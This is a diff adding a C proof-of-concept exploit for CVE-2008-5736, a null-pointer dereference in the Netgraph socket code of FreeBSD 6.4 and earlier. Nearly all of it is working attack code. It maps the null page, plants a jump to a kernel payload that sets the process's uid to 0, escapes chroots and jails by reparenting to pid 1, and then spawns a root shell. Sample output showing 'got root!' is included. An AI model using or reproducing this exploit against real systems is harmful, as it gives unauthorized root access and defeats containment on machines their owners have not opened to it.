@@ -1,0 +1,130 @@
+/*
+ * FreeBSD <= 6.4-RELEASE Netgraph Exploit
+ * by zx2c4
+ * 
+ * 
+ * This is an exploit for CVE-2008-5736, the FreeBSD protosw
+ * and loosely based on Don Bailey's 2008 exploit -
+ * http://www.exploit-db.com/exploits/7581/ . The thing with
+ * Don's exploit is that it relies on having a known location
+ * of allproc, which means having access to the kernel or
+ * debugging symbols, either of which might not be available.
+ * Initial attempts included a general memory search for some
+ * characteristics of allproc, but this was difficult to make
+ * reliable. This solution here is a much more standard - get
+ * the current thread, change its permissions, and execl to
+ * shell. Additionally, it breaks out of chroots and freebsd
+ * jails by reparenting to pid 1 and copying its fds.
+ *
+ * This reliably works on kernels on or below 6.4-RELEASE:
+ *
+ * $ gcc a.c
+ * $ ./a.out
+ * ~ FreeBSD <= 6.4-RELEASE Netgraph Exploit ~
+ * ~~~~~~~~~~~~~~~~~ by zx2c4 ~~~~~~~~~~~~~~~~
+ * ~~~~~ greetz to don bailey, edemveiss ~~~~~
+ *
+ * [+] mmapping null page
+ * [+] adding jmp to pwnage in null page
+ * [+] opening netgraph socket
+ * [+] triggering null dereference
+ * [+] elevating permissions
+ * [+] got root!
+ * #
+ *
+ * It's an oldie, but simple enough that someone needed
+ * to write another PoC exploit at some point.
+ *
+ * cheers,
+ * zx2c4, 27-2-2011
+ *
+ */
+
+#define _KERNEL
+#include <sys/types.h>
+#include <sys/time.h>
+#include <sys/param.h>
+#include <sys/proc.h>
+#include <sys/ucred.h>
+#include <sys/mman.h>
+#include <sys/socket.h>
+#include <sys/stat.h>
+#include <sys/filedesc.h>
+#include <sys/queue.h>
+#include <netgraph/ng_socket.h>
+#include <stdio.h>
+#include <fcntl.h>
+#include <unistd.h>
+
+#define PAGES 1
+
+
+volatile int got_root = 0;
+int root(void)
+{
+	struct thread *thread;
+	asm(
+		"movl %%fs:0, %0"
+		: "=r"(thread)
+	);
+	thread->td_critnest = 0;
+	thread->td_proc->p_ucred->cr_uid = 0;
+	thread->td_proc->p_ucred->cr_prison = NULL;
+
+	struct proc *parent = thread->td_proc;
+	while (parent->p_pptr && parent->p_pid != 1)
+		parent = parent->p_pptr;
+	thread->td_proc->p_fd->fd_rdir = parent->p_fd->fd_rdir;
+	thread->td_proc->p_fd->fd_jdir = parent->p_fd->fd_jdir;
+	thread->td_proc->p_fd->fd_cdir = parent->p_fd->fd_cdir;
+	thread->td_proc->p_pptr = parent;
+
+	got_root = 1;
+	return 0;
+}
+
+int main(int argc, char *argv[])
+{
+	printf("~ FreeBSD <= 6.4-RELEASE Netgraph Exploit ~\n");
+	printf("~~~~~~~~~~~~~~~~~ by zx2c4 ~~~~~~~~~~~~~~~~\n");
+	printf("~~~~~ greetz to don bailey, edemveiss ~~~~~\n\n");
+
+	printf("[+] mmapping null page\n");
+	if (mmap(NULL, PAGES * PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_FIXED, -1, 0) < 0) {
+		perror("[-] mmap failed");
+		return -1;
+	}
+
+	printf("[+] adding jmp to pwnage in null page\n");
+	*(char*)0x0 = 0x90;
+	*(char*)0x1 = 0xe9;
+	*(unsigned long*)0x2 = (unsigned long)&root;
+
+	printf("[+] opening netgraph socket\n");
+	int s = socket(PF_NETGRAPH, SOCK_DGRAM, NG_DATA);
+	if (s < 0) {
+		perror("[-] failed to open netgraph socket");
+		return -1;
+	}
+
+	printf("[+] triggering null dereference\n");
+	shutdown(s, SHUT_RDWR);
+
+	if (!got_root) {
+		printf("[-] failed to trigger pwnage\n");
+		return -1;
+	}
+
+	printf("[+] elevating permissions\n");
+	setuid(0);	
+	setgid(0);
+	if (getuid() != 0) {
+		printf("[-] failed to get root\n");
+		return -1;
+	}
+
+	printf("[+] got root!\n");
+	execl("/bin/sh", "sh", NULL);
+
+	return 0;
+}
